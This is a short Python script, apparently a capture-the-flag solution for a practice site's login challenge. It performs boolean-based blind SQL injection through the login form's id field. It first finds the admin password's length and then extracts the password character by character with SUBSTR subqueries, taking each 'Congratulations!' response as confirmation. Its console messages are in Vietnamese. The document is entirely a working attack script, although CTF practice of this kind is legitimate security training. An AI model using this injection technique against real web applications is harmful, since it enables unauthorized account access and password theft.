import requests
import string

def length_pass_check():
    url = 'http://ctfq.sweetduet.info:10080/~q6/'

    for i in range(1000):
        sql_inject = "admin\' AND {} = (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') --".format(i)
        form = {
            'id': sql_inject,
            'pass': 'nguyenmanh'
        }
        res = requests.post(url, data=form)
        if res.text.find("Congratulations!") != -1:
            print('Pass chỉ dài {} thôi đại ca ạ!'.format(i))
            break


def leak_pass_easy():
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    str_table = string.printable

    for i in range(1, 23):
        for j in str_table:
            sql_inject = "admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {}, 1) = '{}' --".format(i, j)
            # print(sql_inject)
            form = {
                'id': sql_inject,
                'pass': 'nguyenmanh'
            }
            res = requests.post(url, data=form)
            # print(res.text)
            print("Để em viết Flag ra cho đại ca nhé!")
            if res.text.find("Congratulations!") != -1:
                print(j, end="", flush=True)
                break

if __name__ == '__main__':
    leak_pass_easy()